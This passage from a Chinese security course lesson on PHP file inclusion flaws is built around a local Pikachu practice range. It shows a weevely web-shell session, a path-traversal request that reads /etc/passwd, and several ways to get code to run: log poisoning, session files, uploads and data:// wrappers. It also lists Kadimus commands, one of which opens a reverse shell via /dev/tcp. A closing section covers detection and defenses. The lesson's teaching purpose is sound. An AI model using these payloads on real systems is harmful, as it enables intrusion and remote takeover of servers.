<span class="line"><span style="color:#E1E4E8;">uid</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1000</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">www-data</span><span style="color:#E1E4E8;">) gid</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">50</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">staff</span><span style="color:#E1E4E8;">) groups</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">50</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">staff</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">python3</span><span style="color:#24292E;"> </span><span style="color:#032F62;">weevely.py</span><span style="color:#24292E;"> </span><span style="color:#032F62;">http://127.0.0.1:8080/shell.php</span><span style="color:#24292E;"> </span><span style="color:#032F62;">test</span></span>
<span class="line"><span style="color:#24292E;">[+] weevely 4.0.1</span></span>
<span class="line"><span style="color:#24292E;">[+] Target:	www-data@7286434c6e88:/app</span></span>
<span class="line"><span style="color:#24292E;">[+] Session:	/home/admin/.weevely/sessions/127.0.0.1/shell_1.session</span></span>
<span class="line"><span style="color:#24292E;">[+] Shell:	System shell</span></span>
<span class="line"><span style="color:#24292E;">[+] Browse the filesystem or execute commands starts the connection</span></span>
<span class="line"><span style="color:#24292E;">[+] to the target. Type :help </span><span style="color:#D73A49;">for</span><span style="color:#24292E;"> more information.</span></span>
<span class="line"><span style="color:#6F42C1;">weevely&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">ls</span></span>
<span class="line"><span style="color:#6F42C1;">a.php</span></span>
<span class="line"><span style="color:#6F42C1;">assets</span></span>
<span class="line"><span style="color:#6F42C1;">Dockerfile</span></span>
<span class="line"><span style="color:#6F42C1;">footer.php</span></span>
<span class="line"><span style="color:#6F42C1;">header.php</span></span>
<span class="line"><span style="color:#6F42C1;">inc</span></span>
<span class="line"><span style="color:#6F42C1;">index.php</span></span>
<span class="line"><span style="color:#6F42C1;">install.php</span></span>
<span class="line"><span style="color:#6F42C1;">LICENSE</span></span>
<span class="line"><span style="color:#6F42C1;">pkxss</span></span>
<span class="line"><span style="color:#6F42C1;">README.md</span></span>
<span class="line"><span style="color:#6F42C1;">shell.php</span></span>
<span class="line"><span style="color:#6F42C1;">shell.txt</span></span>
<span class="line"><span style="color:#005CC5;">test</span></span>
<span class="line"><span style="color:#6F42C1;">vul</span></span>
<span class="line"><span style="color:#6F42C1;">wiki</span></span>
<span class="line"><span style="color:#6F42C1;">www-data@7286434c6e88:/app</span><span style="color:#24292E;"> $ </span><span style="color:#032F62;">id</span></span>
<span class="line"><span style="color:#24292E;">uid</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1000</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">www-data</span><span style="color:#24292E;">) gid</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">50</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">staff</span><span style="color:#24292E;">) groups</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">50</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">staff</span><span style="color:#24292E;">)</span></span></code></pre></div><h3 id="本地文件包含" tabindex="-1">本地文件包含 <a class="header-anchor" href="#本地文件包含" aria-label="Permalink to &quot;本地文件包含&quot;">​</a></h3><p>如果加载的包含文件不允许从外部服务器获取，只能加载本地文件，那么这就属于本地文件包含。正常情况下，本地文件并不会包含一句话木马等恶意文件（需要使用其他更高级的利用技巧，具体见下文），但有时可以用来读取服务器的敏感文件，如果对方有回显的话。</p><p>比如 Pikachu 靶场的&quot;File Inclusion(local)&quot;题目，我们可以尝试读取 /etc/passwd 文件，构造如下请求：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre></div><p>成功读取到 /etc/passwd 文件。</p>`,21),F=a("p",null,"图 4 利用漏洞读取 /etc/passwd 文件",-1),d=a("h3",{id:"漏洞利用技巧",tabindex:"-1"},[s("漏洞利用技巧 "),a("a",{class:"header-anchor",href:"#漏洞利用技巧","aria-label":'Permalink to "漏洞利用技巧"'},"​")],-1),u=a("p",null,"随着PHP 5.2 之后默认关闭 allow_url_include 配置，也降低了远程文件包含漏洞的出现。但是本地文件包含漏洞的利用方式，很多也适用于远程文件包含漏洞，下面会介绍一些相对通用的利用技巧。",-1),_=a("p",null,"此处漏洞利用的目标仍然是为了获取服务器的 shell 权限，就需要设法在服务器上写入文件，内容自然是一句话等恶意代码内容。但是，我们手上又没有写任意文件的漏洞可利用，只能看看服务器上哪些文件会写入外部用户可控数据，或者其他可执行 PHP 代码的方式。",-1),g=a("p",null,"总结起来，主要有下面几种利用方式。",-1),C=a("h4",{id:"_1-写日志文件",tabindex:"-1"},[s("1.写日志文件 "),a("a",{class:"header-anchor",href:"#_1-写日志文件","aria-label":'Permalink to "1.写日志文件"'},"​")],-1),m=a("p",null,"如果服务器开启访问日志记录的话，那么用户的请求数据就会被记录在日志文件，若我们在地址上包含一句话木马的话，也同样会被记录进去。如果将一句话写在 URL 中常常会被 URL 编码存储，因此需要写 User-Agent 中，其他 HTTP 头默认不会被记录：",-1),A=l('<p>图 5 注入一句话木马的访问日志</p><p>写入一句话木马之后，利用方式前面已经多次讲过，此处不再赘述。</p><p>常见的日志文件路径有：</p><p>/var/log/apache/access_log</p><p>/var/log/apache2/access.log</p><p>/var/log/apache2/error.log</p><p>/var/www/logs/access_log</p><p>/var/log/access_log</p><p>......</p><p>除此之外，还有些 SSH、FTP、邮件等可产生日志的地方都可以自由发挥。</p><h4 id="_2-写系统环境文件" tabindex="-1">2.写系统环境文件 <a class="header-anchor" href="#_2-写系统环境文件" aria-label="Permalink to &quot;2.写系统环境文件&quot;">​</a></h4><p>/proc/self/environ 包含一些系统环境变量，比如 HTTP_USER_AGENT、HTTP_REFERER 等等，但需要 root 权限。如果当前的 web 应用无法写 /proc/self/environ 文件，就无法利用此方法，刚好我安装的 Pikachu 靶场就没有 root 权限。</p><p>若拥有写 /proc/self/environ 的权限，那么可以在 User Agent 中写入创建一句话木马的 PHP 代码，然后再利用漏洞包含 /proc/self/environ 文件实现代码的执行，整个过程与写日志文件的方式类似。</p><h4 id="_3-写-session-文件" tabindex="-1">3.写 Session 文件 <a class="header-anchor" href="#_3-写-session-文件" aria-label="Permalink to &quot;3.写 Session 文件&quot;">​</a></h4><p>PHP 中的 Session 文件用于存储 Session 数据，它是根据 PHPSESSID 来命名文件存储，它常见下面几个路径：</p><ul><li><p>/var/lib/php/sessions/sess_{PHPSESSID}</p></li><li><p>/var/lib/php/sess_{PHPSESSID}</p></li><li><p>/tmp/sess_{PHPSESSID}</p></li><li><p>/tmp/sessions/sess_{PHPSESSID}</p></li></ul><p>PHPSESSID 存放在 Cookie 中：</p>',17),v=l(`<p>图 6 PHPSESSID</p><p>在 Pikachu 靶场中的对应 Session 文件为：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">var</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">lib</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">php</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">sessions</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">sess_v2lvugriupo8qm9r8c7ot7lol2</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">/</span><span style="color:#24292E;">var</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">lib</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">php</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">sessions</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">sess_v2lvugriupo8qm9r8c7ot7lol2</span></span></code></pre></div><p>不过它是空文件，因为它没有写 Session 的行为。</p><p>但如果有用户数据存储到 Session 的行为，比如代码：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#E1E4E8;">php</span></span>
<span class="line"><span style="color:#B392F0;">session_start</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">$ctfs</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$</span><span style="color:#F97583;">_GET</span><span style="color:#E1E4E8;">[</span><span style="color:#9ECBFF;">&#39;data&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">$</span><span style="color:#F97583;">_SESSION</span><span style="color:#E1E4E8;">[</span><span style="color:#9ECBFF;">&quot;username&quot;</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$data;</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#24292E;">php</span></span>
<span class="line"><span style="color:#6F42C1;">session_start</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">$ctfs</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$</span><span style="color:#D73A49;">_GET</span><span style="color:#24292E;">[</span><span style="color:#032F62;">&#39;data&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">$</span><span style="color:#D73A49;">_SESSION</span><span style="color:#24292E;">[</span><span style="color:#032F62;">&quot;username&quot;</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$data;</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>就可以通过 GET 参数 data 写入要执行的 PHP 代码，然后利用漏洞包含对应的 Session 文件就可以实现代码执行。这种利用方式不是那么通用，得多尝试才知道如何写数据到 Session 文件，甚至可能一直找不到。</p><h4 id="_4-利用上传文件" tabindex="-1">4.利用上传文件 <a class="header-anchor" href="#_4-利用上传文件" aria-label="Permalink to &quot;4.利用上传文件&quot;">​</a></h4><p>如果有上传文件的地址，并且可以知道上传路径，比如上传头像的位置，可以上传个写一句话木马的 jpg 文件，然后利用文件包含漏洞去执行。</p><h4 id="_5-利用-php-伪协议" tabindex="-1">5.利用 PHP 伪协议 <a class="header-anchor" href="#_5-利用-php-伪协议" aria-label="Permalink to &quot;5.利用 PHP 伪协议&quot;">​</a></h4><p>PHP 拥有许多伪协议，在远程和本地文件包含中都可以使用，我做个表总结下：</p>`,11),f=a("p",null,"此处我直接利用 data:// 执行代码，这比远程文件包含中利用方式便捷太多了，比如下面直接系统命令的示例。",-1),$=l('<p>图 7 利用 data:// 伪协议执行系统命令</p><h3 id="挖掘文件包含漏洞" tabindex="-1">挖掘文件包含漏洞 <a class="header-anchor" href="#挖掘文件包含漏洞" aria-label="Permalink to &quot;挖掘文件包含漏洞&quot;">​</a></h3><h4 id="_1-动态检测思路" tabindex="-1">1.动态检测思路 <a class="header-anchor" href="#_1-动态检测思路" aria-label="Permalink to &quot;1.动态检测思路&quot;">​</a></h4><p>挖掘文件包含漏洞的方式与测试漏洞的利用思路是一样的，分为本地和远程两种情况。</p><ul><li><strong>远程文件包含漏洞检测</strong></li></ul><p>（1）向目标参数指定远程 URL 发起请求，确定远程服务器是否收到相应请求，此步骤可利用前面介绍过的 Burp Collaborator 进行测试。若发起请求说明有可能存在远程请求文件，同时也可能出现 SSRF 漏洞。</p><p>（2）如果第 1 步失败，尝试提交一个不存在的 IP 地址，并确认服务器尝试连接此 IP 时是否会出现超时。</p><p>（3）若第 1 步确认访问成功或者第 2 步确认请求超时，那么按前面介绍的利用方法，尝试利用远程文件包含漏洞以作最终确认。</p><ul><li><strong>本地文件包含漏洞检测</strong></li></ul><p>（1）向目标参数提交一个已知的可执行资源的文件路径，比如 PHP 文件路径，看应用程序是否有任何变化。</p><p>（2）向目标参数提交一个已知的静态资源的文件路径，比如图片，看它的内容是否会再现在响应数据中。</p><p>（3）若第 1 步或第 2 步出现引用指定资源的情况，则按前面介绍的利用技巧尝试对疑似本地文件包含漏洞进行测试验证。</p><p>上述检测思路既适用于手工测试，也适用于日常的自动化扫描。</p><h4 id="_2-静态检测思路" tabindex="-1">2.静态检测思路 <a class="header-anchor" href="#_2-静态检测思路" aria-label="Permalink to &quot;2.静态检测思路&quot;">​</a></h4><p>从源码入手，采用前面介绍过的污点分析思路进行代码审计。梳理下文件包含漏洞产生的相关 source 与 sink，然后去追踪数据流从 source 传播到 sink 过程中是否有进行过滤，若没有则可能存在文件包含漏洞。</p>',15),b=l(`<h4 id="_3-自动化检测与利用工具-kadimus" tabindex="-1">3.自动化检测与利用工具：Kadimus <a class="header-anchor" href="#_3-自动化检测与利用工具-kadimus" aria-label="Permalink to &quot;3.自动化检测与利用工具：Kadimus&quot;">​</a></h4><p>提到自动化扫描，这里推荐一款自动化检测与利用文件包含漏洞的工具，它叫 <a href="https://github.com/P0cL4bs/Kadimus/" target="_blank" rel="noreferrer">Kadimus</a>，支持较多的利用方式，有部分是在前面未介绍到的，比如利用 /var/log/auth.log 实现远程代码执行的方法，利用它可以更加便捷地针对文件包含漏洞进行测试利用。</p><p>介绍几个常用命令：</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;"># 检测参数是否存在文件包含漏洞</span></span>
<span class="line"><span style="color:#B392F0;">./kadimus</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost/?pg=contact</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-A</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">my_user_agent</span></span>
<span class="line"><span style="color:#6A737D;"># 读取文件内容</span></span>
<span class="line"><span style="color:#B392F0;">./kadimus</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost/?pg=contact</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-S</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-f</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;index.php%00&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-O</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">local_output.php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">--parameter</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">pg</span></span>
<span class="line"><span style="color:#6A737D;"># 执行PHP代码</span></span>
<span class="line"><span style="color:#B392F0;">./kadimus</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost/?pg=php://input%00</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-C</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;?php echo &quot;pwned&quot;; ?&gt;&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-T</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">input</span></span>
<span class="line"><span style="color:#6A737D;"># 执行系统命令</span></span>
<span class="line"><span style="color:#B392F0;">./kadimus</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-t</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost/?pg=/var/log/auth.log</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-T</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">auth</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-c</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;ls -lah&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">--ssh-target</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost</span></span>
<span class="line"><span style="color:#6A737D;"># 反连shell</span></span>
<span class="line"><span style="color:#B392F0;">./kadimus</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">localhost/?pg=contact.php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-T</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">data</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">--parameter</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">pg</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-lp</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">12345</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-c</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1&quot;&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">--retry-times</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;"># 检测参数是否存在文件包含漏洞</span></span>
<span class="line"><span style="color:#6F42C1;">./kadimus</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-u</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost/?pg=contact</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-A</span><span style="color:#24292E;"> </span><span style="color:#032F62;">my_user_agent</span></span>
<span class="line"><span style="color:#6A737D;"># 读取文件内容</span></span>
<span class="line"><span style="color:#6F42C1;">./kadimus</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-u</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost/?pg=contact</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-S</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-f</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;index.php%00&quot;</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-O</span><span style="color:#24292E;"> </span><span style="color:#032F62;">local_output.php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">--parameter</span><span style="color:#24292E;"> </span><span style="color:#032F62;">pg</span></span>
<span class="line"><span style="color:#6A737D;"># 执行PHP代码</span></span>
<span class="line"><span style="color:#6F42C1;">./kadimus</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-u</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost/?pg=php://input%00</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-C</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;?php echo &quot;pwned&quot;; ?&gt;&#39;</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-T</span><span style="color:#24292E;"> </span><span style="color:#032F62;">input</span></span>
<span class="line"><span style="color:#6A737D;"># 执行系统命令</span></span>
<span class="line"><span style="color:#6F42C1;">./kadimus</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-t</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost/?pg=/var/log/auth.log</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-T</span><span style="color:#24292E;"> </span><span style="color:#032F62;">auth</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-c</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;ls -lah&#39;</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">--ssh-target</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost</span></span>
<span class="line"><span style="color:#6A737D;"># 反连shell</span></span>
<span class="line"><span style="color:#6F42C1;">./kadimus</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-u</span><span style="color:#24292E;"> </span><span style="color:#032F62;">localhost/?pg=contact.php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-T</span><span style="color:#24292E;"> </span><span style="color:#032F62;">data</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">--parameter</span><span style="color:#24292E;"> </span><span style="color:#032F62;">pg</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-lp</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">12345</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-c</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1&quot;&#39;</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">--retry-times</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span></span></code></pre></div><h3 id="漏洞防御" tabindex="-1">漏洞防御 <a class="header-anchor" href="#漏洞防御" aria-label="Permalink to &quot;漏洞防御&quot;">​</a></h3><h4 id="_1-白名单限制" tabindex="-1">1.白名单限制 <a class="header-anchor" href="#_1-白名单限制" aria-label="Permalink to &quot;1.白名单限制&quot;">​</a></h4><p>如果已经知道要包含的文件范围，那么直接使用白名单限制，比如：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( $file </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;include.php&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $file </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;file1.php&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $file </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;file2.php&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $file </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;file3.php&quot;</span><span style="color:#E1E4E8;"> ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// This isn&#39;t the page we want!</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;ERROR: File not found!&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">exit</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">( $file </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;include.php&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $file </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;file1.php&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $file </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;file2.php&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $file </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;file3.php&quot;</span><span style="color:#24292E;"> ) {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// This isn&#39;t the page we want!</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;ERROR: File not found!&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">exit</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre></div><h4 id="_2-设置-open-basedir" tabindex="-1">2.设置 open_basedir <a class="header-anchor" href="#_2-设置-open-basedir" aria-label="Permalink to &quot;2.设置 open_basedir&quot;">​</a></h4><p>在 php.ini 中设置 open_basedir，可允许将 PHP 打开的文件限制在指定的目录中，可有效防止跨目录访问一些系统敏感文件。除了 php.ini 设置方法外，还可在代码中设置：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">ini_set</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;open_basedir&#39;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&#39;指定目录&#39;</span><span style="color:#E1E4E8;">);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">ini_set</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;open_basedir&#39;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&#39;指定目录&#39;</span><span style="color:#24292E;">);</span></span></code></pre></div><h4 id="_3-关闭-allow-url-include" tabindex="-1">3.关闭 allow_url_include <a class="header-anchor" href="#_3-关闭-allow-url-include" aria-label="Permalink to &quot;3.关闭 allow_url_include&quot;">​</a></h4><p>在 php.ini 中设置 allow_url_include＝Off（默认关闭），避免远程文件包含，同时减少一些伪协议的攻击，提高漏洞利用成本。</p><h3 id="小结" tabindex="-1">小结 <a class="header-anchor" href="#小结" aria-label="Permalink to &quot;小结&quot;">​</a></h3><p>本节课主要介绍了远程和本地两种类型的文件包含漏洞，教你如何挖掘与利用漏洞，以及如何防御。</p><p>&quot;文件包含&quot;漏洞的产生主要是因为对用户输入数据没有进行有效过滤，导致允许包含任意文件，进而执行恶意代码。所以在开发过程中，特别要注意使用文件包含函数时，要对输入变量进行过滤限制，限制文件路径或者白名单。</p><p>希望你在学习本课程时，也能跟着动手检测与利用漏洞，操作一遍可以加深理解，提高动手能力。毕竟本地文件包含漏洞的利用方式有点绕，可以先执行一个正常且合理的操作，再利用漏洞实现代码执行。</p><p>下一节课开始，我将给你介绍越权漏洞，它在不同的业务场景下可以造成不同的危害，因为它的特殊性，且比较偏业务逻辑处理上的问题，对它的检测与利用上都造成的挑战。</p><hr><p><a href="https://wj.qq.com/s2/8059116/3881/" target="_blank" rel="noreferrer">课程评价入口，挑选 5 名小伙伴赠送小礼品～</a></p>`,20);function k(B,q,D,P,w,S){const p=e("Image");return t(),c("div",null,[y,n(p,{alt:"图片1.png",src:"https://s0.lgstatic.com/i/image2/M01/0C/3C/Cip5yGAX4A2AGQJLAALnh3QheXo648.png"}),s(),E,n(p,{alt:"图片2.png",src:"https://s0.lgstatic.com/i/image/M00/94/50/CgqCHmAX4CWALTY8AAQPl3E0Ay4160.png"}),s(),i,n(p,{alt:"图片3.png",src:"https://s0.lgstatic.com/i/image/M00/94/50/CgqCHmAX4DSAJYH3AAQINnkRH5s611.png"}),s(),h,n(p,{alt:"图片4.png",src:"https://s0.lgstatic.com/i/image2/M01/0C/3C/Cip5yGAX4EmATdfwAAIXYjl0obE125.png"}),s(),F,d,u,_,g,C,m,n(p,{alt:"图片5.png",src:"https://s0.lgstatic.com/i/image/M00/94/45/Ciqc1GAX4FmADM5PAASEhBTUaiw277.png"}),s(),A,n(p,{alt:"图片6.png",src:"https://s0.lgstatic.com/i/image/M00/94/50/CgqCHmAX4HOAWgwcAADxpVOzpUc744.png"}),s(),v,n(p,{alt:"图片8.png",src:"https://s0.lgstatic.com/i/image2/M01/0C/3D/Cip5yGAX4KSAapyBAAPVaA5QE1A158.png"}),s(),f,n(p,{alt:"图片7.png",src:"https://s0.lgstatic.com/i/image2/M01/0C/3D/Cip5yGAX4LqAHITdAAFk7HY8mf8051.png"}),s(),$,n(p,{alt:"图片9.png",src:"https://s0.lgstatic.com/i/image/M00/94/51/CgqCHmAX4MqASFfNAAFRLvvVLVE597.png"}),s(),b])}const H=o(r,[["render",k]]);export{x as __pageData,H as default};
